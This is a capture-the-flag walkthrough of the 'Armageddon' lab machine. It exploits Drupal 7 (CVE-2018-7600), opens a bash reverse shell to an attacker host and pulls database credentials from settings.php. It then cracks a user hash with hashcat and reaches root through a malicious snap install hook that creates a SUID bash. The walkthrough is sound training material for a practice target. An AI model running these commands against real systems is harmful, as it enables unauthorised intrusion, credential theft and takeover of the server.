# Armageddon
## Reconnaissance
### Initial Port Scan
```bash
sudo /opt/nmapAutomator/nmapAutomator.sh 10.10.10.233 All
```
* Result

![1_OpenPorts](https://user-images.githubusercontent.com/53956303/132596945-807580da-5eef-41c0-80d5-9daa33edcc36.jpg)

## Enumeration
## Port 80
* On the Port 80, Armageddon web page is found

![2_port80](https://user-images.githubusercontent.com/53956303/132596951-a23726b6-db4d-4568-8be7-54ab1f77ecd3.jpg)
### Gobuster on Port 80
* Use Gobuster to find directories on Port 80

![3_Gobuster](https://user-images.githubusercontent.com/53956303/132597015-cb0d210f-ab37-4084-8347-898f3c6bf25a.jpg)
### Robots.txt
* Since "Robots.txt" is found from the Gobuster result, enumerate the file

![4_robots](https://user-images.githubusercontent.com/53956303/132597087-f38333ca-52cc-4277-8067-d88110e632a4.jpg)
### Page Source
* From the page source, a application name and version number is found
    * `Drupal 7`

![5_page_source](https://user-images.githubusercontent.com/53956303/132597107-42c77159-12c9-4f5a-bc2c-daafaac2c09c.jpg)
## Exploitation
### Drupal 7 <= 7.57 Remote Code Execution (CVE-2018-7600)
|[Drupal 7 <= 7.57 Remote Code Execution (CVE-2018-7600)](https://github.com/pimps/CVE-2018-7600)|
|----|
* Test the exploit with `whoami` command
    * Save `drupa7-CVE-2018-7600.py` as `exploit.py`
```bash
python3 exploit.py -c whoami http://10.10.10.233
```
* The exploit works

![6_exploit](https://user-images.githubusercontent.com/53956303/132597121-f3f9fc6d-c6b7-4f4b-a60c-98b954e5a7b7.jpg)
### Getting a Initial Shell
* Since the exploit works to get response, it might be used to get an initial shell
#### Open a Netcat Listener
```bash
sudo nc -lnpv 4444
```
#### Execute bash reverse shell command using the exploit
```bash
python3 exploit.py -c 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' http://10.10.10.233
```
![8_exploit](https://user-images.githubusercontent.com/53956303/132597280-3bf0aa63-1c2b-4d49-aeed-14d132dc8cce.jpg)
* As a result a reverse shell as "apache" is open

![7_initial_shell](https://user-images.githubusercontent.com/53956303/132597286-83bd8145-7f6e-4f2f-8d8d-913ba79dc955.jpg)
## Privilege Escalation
### Local Enumeration
* Since the drupal database is found from `/sites/default/settings.php`, enumerate that file
    * from `/var/www/html/sites/default/settings.php`, database name, username, and password are found
        *      database = drupal
               usename = drupaluser
               password = CQHEy@9M*m23gBVj
## Mysql Enumeartion
* Enumerate the SQL server with login at the same time
```bash
mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'show tables'
```
* From the result, some tables are found

![9_SQL](https://user-images.githubusercontent.com/53956303/132597366-cee162f8-9184-4883-999e-01745ac91a3f.jpg)
### Extract values from the `users` table
```bash
mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'select * from users;'
```
* From the result, a username and password hash is found
    * `brucetherealadmin / $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt`

![10_SQL_2](https://user-images.githubusercontent.com/53956303/132597391-74c8a740-820a-45c9-a58c-81aebeaff028.jpg)
### Crack the hash using hashcat
#### Hashcat example hash
```bash
hashcat --example-hashes
```
* From the exmple, a hash mode 7900 for Drupal7 is found

![11_hashcat_drupal](https://user-images.githubusercontent.com/53956303/132597400-bab2673d-7095-4fc3-9420-f7180a5cd3a8.jpg)
#### Crack the hash using hashcat
```bash
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt --force
```
* From the result, a password for `brucetherealadmin` user is found
    * `brucetherealadmin / booboo`

![12_hashcat](https://user-images.githubusercontent.com/53956303/132597409-b76a5f87-0df9-4c0f-a587-7d16ec69d40d.jpg)
### Getting a SSH shell as `brucetherealadmin`
```bash
ssh brucetherealadmin@10.10.10.233
#password: booboo
```
* As a result, a ssh shell as 'brucetherealadmin' is open

## Privilege Escalation (brucetherealadmin => root)
### See the sudo privilege
```bash
sudo -l
```
* From the result, the 'brucetherealadmin' can use `/usr/bin/snap install *` without password

![13_sudo](https://user-images.githubusercontent.com/53956303/132597434-d767b043-a899-470d-8645-d55161e6b9a9.jpg)

### sudo `snap install` exploit
#### Build a snap file on Kali (Save as ch.snap)
* From GTFOBins, an exploit for `snap` using sudo privilege is found

|[Sudo snap Exploit](https://gtfobins.github.io/gtfobins/snap/#sudo)|
|----|

* It makes `/bin/bash` SUID binary
    * Make sure copy the `/usr/bin/bash` to the home directory
```bash
COMMAND="chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
#### Transfer it to the target machine
* Open a python server
```bash
sudo python3 -m http.server 80
```
* Use Curl to download the file on the target machine
```bash
curl http://10.10.14.3/xxx_1.0_all.snap -o ch.snap
```
#### install the malicious snap file

```bash
sudo snap install ch.snap --dangerous --devmode
```
* Successfully made a root owned SUID binary `bash`

![14_chod](https://user-images.githubusercontent.com/53956303/132597457-fb1920a4-109c-4acd-a944-e4aea65aaf23.jpg)
### Spawn a root shell
```bash
cd ~
./bash -p
```
* As a result, the shell with `euid of 0` is spawned

![15_root](https://user-images.githubusercontent.com/53956303/132597461-0c262732-9505-47a2-bd40-c9aa75be2e94.jpg)
* from `/root`, the root flag is found

![16_root_LI](https://user-images.githubusercontent.com/53956303/132597537-147766d5-8e9b-4380-9126-cf7d65714f1b.jpg)
